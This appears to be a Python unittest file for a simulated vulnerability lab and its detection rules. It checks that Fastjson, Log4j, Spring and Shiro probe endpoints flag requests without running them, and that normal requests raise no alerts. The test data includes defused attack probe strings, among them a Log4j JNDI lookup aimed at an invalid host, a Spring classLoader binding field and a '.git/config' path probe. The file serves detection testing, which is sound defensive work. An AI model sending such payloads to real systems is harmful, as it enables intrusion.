from __future__ import annotations

import json
import sys
import time
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import target_multivuln_lab as lab  # noqa: E402
from security_detection_v2 import POCRuleEngine  # noqa: E402
from situation_core import normalize_action_type  # noqa: E402


class FullChainLabTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        lab.init_db()
        lab._BLOCK_CACHE["ts"] = time.time()
        lab._BLOCK_CACHE["ips"] = set()
        cls.client = lab.app.test_client()
        cls.rules = POCRuleEngine(ROOT / "rules" / "poc_rules.json")

    def test_home_exposes_phases_and_full_chain_runner(self) -> None:
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        text = response.get_data(as_text=True)
        for label in ("信息收集", "经典漏洞", "N-day 特征模拟", "未知威胁模拟", "开始全链路模拟"):
            self.assertIn(label, text)
        self.assertNotIn("真实 0-day", text)

    def test_safe_nday_and_unknown_endpoints_never_execute(self) -> None:
        cases = [
            ("/api/nday/fastjson/parse", {"@type": "com.example.SafeProbe", "marker": "FASTJSON-CVE-SIM"}),
            ("/api/nday/log4j/search", {"query": "${jndi:ldap://probe.invalid/LOG4J-CVE-SIM}"}),
            ("/api/nday/spring/bind", {"field": "class.module.classLoader", "marker": "SPRING-CVE-SIM"}),
            ("/api/nday/shiro/session", {"rememberMe": "SAFE_SHIRO_PROBE", "path": "/admin/"}),
            ("/api/unknown/probe", {"marker": "ZERO_DAY_BEHAVIOR_SIM", "nested_depth": 18}),
        ]
        for path, body in cases:
            with self.subTest(path=path):
                response = self.client.post(path, json=body)
                self.assertEqual(response.status_code, 200)
                payload = response.get_json()
                self.assertTrue(payload["simulation"])
                self.assertTrue(payload["detected"])
                self.assertFalse(payload.get("executed", False))

    def test_new_signatures_map_to_situation_actions(self) -> None:
        cases = [
            ("/api/recon/ports", {"scan_mode": "connect", "ports": [22, 80, 443, 3306]}, "端口扫描", "PORT_SCAN"),
            ("/api/recon/directory?path=/.git/config", None, "目录扫描", "DIRECTORY_SCAN"),
            ("/api/nday/fastjson/parse", {"@type": "com.example.SafeProbe", "marker": "FASTJSON-CVE-SIM"}, "Fastjson反序列化探测", "FASTJSON_NDAY"),
            ("/api/nday/log4j/search", {"query": "${jndi:ldap://probe.invalid/LOG4J-CVE-SIM}"}, "Log4j JNDI探测", "LOG4J_NDAY"),
            ("/api/nday/spring/bind", {"field": "class.module.classLoader", "marker": "SPRING-CVE-SIM"}, "Spring数据绑定探测", "SPRING_NDAY"),
            ("/api/nday/shiro/session", {"rememberMe": "SAFE_SHIRO_PROBE"}, "Shiro认证探测", "SHIRO_NDAY"),
            ("/api/unknown/probe", {"marker": "ZERO_DAY_BEHAVIOR_SIM", "nested_depth": 18}, "未知威胁探测", "UNKNOWN_THREAT"),
        ]
        for uri, body, expected_type, expected_action in cases:
            with self.subTest(uri=uri):
                event = {
                    "method": "POST" if body is not None else "GET",
                    "uri": uri,
                    "content_type": "application/json",
                    "body": json.dumps(body, ensure_ascii=False) if body is not None else "",
                }
                matches = self.rules.match(event)
                attack_types = {item.attack_type for item in matches}
                self.assertIn(expected_type, attack_types)
                self.assertEqual(normalize_action_type(expected_type), expected_action)

    def test_normal_samples_do_not_match_new_nday_rules(self) -> None:
        cases = [
            ("/api/nday/fastjson/parse", {"name": "normal-request", "safe": True}),
            ("/api/nday/log4j/search", {"query": "security documentation"}),
            ("/api/nday/spring/bind", {"field": "profile.displayName", "value": "tester"}),
            ("/api/nday/shiro/session", {"rememberMe": False, "path": "/profile"}),
        ]
        for uri, body in cases:
            with self.subTest(uri=uri):
                event = {
                    "method": "POST",
                    "uri": uri,
                    "content_type": "application/json",
                    "body": json.dumps(body, ensure_ascii=False),
                }
                matches = [item for item in self.rules.match(event) if "nday" in item.tags]
                self.assertEqual(matches, [])


if __name__ == "__main__":
    unittest.main()
